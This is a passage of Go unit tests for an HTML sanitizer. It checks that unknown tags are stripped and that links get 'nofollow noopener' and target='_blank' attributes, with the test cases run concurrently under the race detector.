			expected: `<p>Hello</p> World `,
		},
		{
			in:       `<p>Hello</p><foo /><p>World</p>`,
			expected: `<p>Hello</p> <p>World</p>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestTargetBlankNoOpener(t *testing.T) {
	p := UGCPolicy()
	p.AddTargetBlankToFullyQualifiedLinks(true)
	p.AllowAttrs("target").Matching(Paragraph).OnElements("a")

	tests := []test{
		{
			in:       `<a href="/path" />`,
			expected: `<a href="/path" rel="nofollow"/>`,
		},
		{
			in:       `<a href="/path" target="_blank" />`,
			expected: `<a href="/path" target="_blank" rel="nofollow noopener"/>`,
		},
		{
			in:       `<a href="/path" target="foo" />`,
			expected: `<a href="/path" target="foo" rel="nofollow"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" />`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="_blank"/>`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noopener"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="nofollow"/>`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener"/>`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener nofollow" />`,
			expected: `<a href="https://www.google.com/" rel="nofollow noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="foo" />`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noopener"/>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}
